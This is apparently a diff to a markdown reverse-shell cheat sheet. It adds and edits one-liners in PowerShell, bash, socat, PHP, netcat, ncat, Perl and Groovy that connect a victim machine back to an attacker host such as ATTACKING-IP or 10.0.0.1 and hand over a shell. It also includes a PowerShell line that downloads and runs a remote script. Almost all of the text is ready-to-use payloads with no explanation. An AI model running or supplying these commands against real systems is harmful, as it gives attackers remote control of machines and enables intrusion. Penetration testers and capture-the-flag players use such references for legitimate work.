@@ -1,3 +1,14 @@
+# Powershell Reverse Shells
+```
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+```
+powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+```
+
 # Python Linux Reverse Shells
 
 ```bash
@@ -22,41 +33,41 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1
 # Bash Reverse Shells
 
 ```bash
-exec /bin/bash 0&0 2>&0
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+0<&196;exec 196<>/dev/tcp/<your IP>/<same unfiltered port>; sh <&196 >&196 2>&196
+```
+# SOCAT
 
 ```
-
-```bash
-0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196
-
+user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
+user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4242
 ```
-```bash
-exec 5<>/dev/tcp/ATTACKING-IP/80
-cat <&5 | while read line; do $line 2>&5 >&5; done  
 
-# or:
-
-while read line 0<&5; do $line 2>&5 >&5; done
-```
 
 # PHP Reverse Shell
-
-```php
-
-php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
 (Assumes TCP uses file descriptor 3. If it doesn't work, try 4,5, or 6)
+```php
+php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'
+
 ```
 
-# Netcat Reverse Shell
+# Netcat Traditional
 
 ```shell
 
-nc -e /bin/sh ATTACKING-IP 80
-
-/bin/sh | nc ATTACKING-IP 80
-
+nc -e /bin/sh [IPADDR] [PORT]
+nc.traditional -e /bin/bash 10.0.0.1 4444
+nc -c bash 10.0.0.1 4444
+```
+# Netcat OpenBsd
+```
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
-
+```
+# Ncat
+```
+ncat 127.0.0.1 4444 -e /bin/bash
+ncat --udp 127.0.0.1 4444 -e /bin/bash
 ```
 
 # Telnet Reverse Shell
@@ -74,7 +85,9 @@ telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 ```bash
 
 perl -e 'use Socket;$i="ATTACKINGIP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-
+```
+```
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 
 # Perl Windows Reverse Shell
@@ -85,7 +98,6 @@ perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen(
 
 perl -e 'use Socket;$i="ATTACKINGIP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
-
 ```
 
 # Ruby Reverse Shell
@@ -93,7 +105,6 @@ perl -e 'use Socket;$i="ATTACKINGIP";$p=80;socket(S,PF_INET,SOCK_STREAM,getproto
 ```bash
 
 ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-
 
 ```
 
@@ -106,5 +117,12 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while r
 p.waitFor()
 
 ```
+# Groovy
 
+```
+String host="localhost";
+int port=8044;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
 
